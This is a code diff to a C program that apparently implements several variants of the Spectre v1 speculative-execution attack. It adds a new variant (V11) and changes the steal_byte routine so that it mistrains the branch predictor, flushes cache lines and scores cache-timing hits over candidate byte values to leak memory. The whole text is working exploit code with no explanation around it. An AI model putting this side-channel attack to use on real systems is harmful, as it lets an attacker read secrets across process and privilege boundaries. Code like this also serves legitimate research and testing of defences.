@@ -42,6 +42,7 @@ void find_cached_index(int* scores){
 	#endif
 	for(; i < 256; i++){
 		time_dif = 0;
+		//printf("i:%d\n",i);
 		measure_time(time_dif, &array[i * 4096]);
 
 		if(time_dif < CACHE_HIT_THRESHOLD){
@@ -88,6 +89,8 @@ void train_victim(){
 		// so the compiler stop complaining
 		//victim_function(0, 1);
 		int x2 = 0;
+		#elif __SPECTRE__V11
+		victim_function(0);
 		#elif __SPECTRE__V12
 		victim_function(0, 1);
 		#elif __SPECTRE__V15
@@ -139,27 +142,27 @@ void train_victim(){
 #ifdef __SPECTRE__V10
 void steal_byte(int* scores, int larger_x){
 	uint64_t time_dif;
-	for(int it = 0; it < 1000; it++){
+	
+	for(int it = 0; it < 100; it++){
 
-		// from 32 to 122 to decrease number of iterations
 		for(uint8_t tryindex = 32; tryindex < 122; tryindex++){
-			
+		
 			// train with buffer[0] = 1 
 			for(int i = 0; i < 20; i++){
 				victim_function(0, 1);
-				//victim_function(0, 2);
-				//clflush(&array[3 * 4096]);
-				//clflush(&bufferSize);
+				// added this line to train branch with 50% accuracy
+				victim_function(0, 2);
 			}
 			clflush(&array[3 * 4096]);
 			clflush(&bufferSize);
 			asm volatile("lfence\n");
 			asm volatile("mfence\n");
+
 			// buffer is in the cache
 			// x will be in the cache
 			// k is in the cache
-			// only outer if will be speculatively executed
-			victim_function(larger_x, 36);
+			// only outer if will be speculatively executed	
+			victim_function(larger_x, tryindex);
 
 			// find the cached index
 			time_dif = 0;
@@ -170,8 +173,8 @@ void steal_byte(int* scores, int larger_x){
 			if(time_dif < (CACHE_HIT_THRESHOLD)){
 				//printf("hit \t tryindex:%d \t tryindex:%c \t time_dif:%ld\n", tryindex, tryindex, time_dif);
 				// found the cached index
-				scores[36]++;
-			}
+				scores[tryindex]++;
+			}	
 		}
 	}
 	find_highest_score(scores);
@@ -184,6 +187,8 @@ void steal_byte(int* scores, int larger_x){
 		// access to the array speculatively
 		#ifdef __SPECTRE__V9
 		victim_function(larger_x, x_is_unsafe);
+		#elif __SPECTRE__V11
+		victim_function(larger_x);
 		#elif __SPECTRE__V12
 		victim_function(larger_x, 0);
 		#elif __SPECTRE__V14
